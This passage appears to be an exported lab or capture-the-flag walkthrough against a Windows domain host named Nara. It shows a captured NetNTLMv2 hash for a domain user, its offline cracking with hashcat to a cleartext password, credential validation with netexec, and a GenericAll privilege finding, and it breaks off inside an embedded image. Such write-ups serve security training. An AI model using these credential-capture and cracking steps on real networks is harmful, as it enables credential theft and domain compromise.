+[SMB] NTLMv2-SSP Hash     : Tracy.White::NARASEC:aaeca4d070dae5e9:0E2CD1F8886806B77194CD70E7C52D05:01010000000000008069555106B3DC0168CD477B6F06F37C0000000002000800500037005500450001001E00570049004E002D004B005000530048004C004D004F00490033004500560004003400570049004E002D004B005000530048004C004D004F0049003300450056002E0050003700550045002E004C004F00430041004C000300140050003700550045002E004C004F00430041004C000500140050003700550045002E004C004F00430041004C00070008008069555106B3DC010600040002000000080030003000000000000000010000000020000040B75E0A64CC790404A2229AE41285676BBAF4D3912C7F9577BC2BF816F2E4B00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310037000000000000000000</pre><pre class="hljs"><code><span class="hljs-selector-attr">[SMB]</span> NTLMv2-SSP Client   : <span class="hljs-number">192.168</span>.<span class="hljs-number">175.30</span>
+<span class="hljs-selector-attr">[SMB]</span> NTLMv2-SSP Username : NARASEC\Tracy<span class="hljs-selector-class">.White</span>
+<span class="hljs-selector-attr">[SMB]</span> NTLMv2-SSP Hash     : Tracy<span class="hljs-selector-class">.White</span>::NARASEC:aaeca4d070dae5e9:<span class="hljs-number">0</span>E2CD1F8886806B77194CD70E7C52D05:<span class="hljs-number">01010000000000008069555106</span>B3DC0168CD477B6F06F37C0000000002000800500037005500450001001E00570049004E002D004B005000530048004C004D004F00490033004500560004003400570049004E002D004B005000530048004C004D004F0049003300450056002E0050003700550045002E004C004F00430041004C000300140050003700550045002E004C004F00430041004C000500140050003700550045002E004C004F00430041004C00070008008069555106B3DC010600040002000000080030003000000000000000010000000020000040B75E0A64CC790404A2229AE41285676BBAF4D3912C7F9577BC2BF816F2E4B00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310037000000000000000000</code></pre></div>
+<p>Save the hash to a file and crack it offline to obtain the password <code class="inline-code">zqwj041FGX</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">TRACY.WHITE::NARASEC:aaeca4d070dae5e9:0e2cd1f8886806b77194cd70e7c52d05:01010000000000008069555106b3dc0168cd477b6f06f37c0000000002000800500037005500450001001e00570049004e002d004b005000530048004c004d004f00490033004500560004003400570049004e002d004b005000530048004c004d004f0049003300450056002e0050003700550045002e004c004f00430041004c000300140050003700550045002e004c004f00430041004c000500140050003700550045002e004c004f00430041004c00070008008069555106b3dc010600040002000000080030003000000000000000010000000020000040b75e0a64cc790404a2229ae41285676bbaf4d3912c7f9577bc2bf816f2e4b00a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200310037000000000000000000:zqwj041FGX
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)</pre><pre class="hljs"><code>TRACY.WHITE<span class="hljs-type">::NARASEC</span>:aaeca4d070dae5e9:<span class="hljs-number">0e2</span>cd1f8886806b77194cd70e7c52d05:<span class="hljs-number">01010000000000008069555106</span>b3dc0168cd477b6f06f37c0000000002000800500037005500450001001e00570049004e002d004b005000530048004c004d004f00490033004500560004003400570049004e002d004b005000530048004c004d004f0049003300450056002e0050003700550045002e004c004f00430041004c000300140050003700550045002e004c004f00430041004c000500140050003700550045002e004c004f00430041004c00070008008069555106b3dc010600040002000000080030003000000000000000010000000020000040b75e0a64cc790404a2229ae41285676bbaf4d3912c7f9577bc2bf816f2e4b00a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200310037000000000000000000:zqwj041FGX
+                                                          
+Session<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>.: hashcat
+Status<span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span>..: Cracked
+Hash.Mode<span class="hljs-params">...</span><span class="hljs-params">...</span>..: <span class="hljs-number">5600</span> (NetNTLMv2)</code></pre></div>
+<p>Now I have a valid set of domain credentials:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Nara]
+&boxur;&boxh;$ nxc smb 192.168.175.30 -u tracy.white -p zqwj041FGX
+SMB         192.168.175.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.175.30  445    NARA             [+] nara-security.com\tracy.white:zqwj041FGX</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Nara]</span>
+&boxur;&boxh;$ nxc smb <span class="hljs-number">192.168</span><span class="hljs-selector-class">.175</span><span class="hljs-selector-class">.30</span> -u tracy<span class="hljs-selector-class">.white</span> -<span class="hljs-selector-tag">p</span> zqwj041FGX
+SMB         <span class="hljs-number">192.168</span><span class="hljs-selector-class">.175</span><span class="hljs-selector-class">.30</span>  <span class="hljs-number">445</span>    NARA             <span class="hljs-selector-attr">[*]</span> Windows Server <span class="hljs-number">2022</span> Build <span class="hljs-number">20348</span> x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         <span class="hljs-number">192.168</span><span class="hljs-selector-class">.175</span><span class="hljs-selector-class">.30</span>  <span class="hljs-number">445</span>    NARA             <span class="hljs-selector-attr">[+]</span> nara-security<span class="hljs-selector-class">.com</span>\tracy<span class="hljs-selector-class">.white</span>:zqwj041FGX</code></pre></div>
+<p>The user <code class="inline-code">tracy.white</code> has GenericAll privileges over the <code class="inline-code">Remote Access</code> group and <code class="inline-code">Remote</code> GPO:<br/>
+<img src="data:image/png;base64,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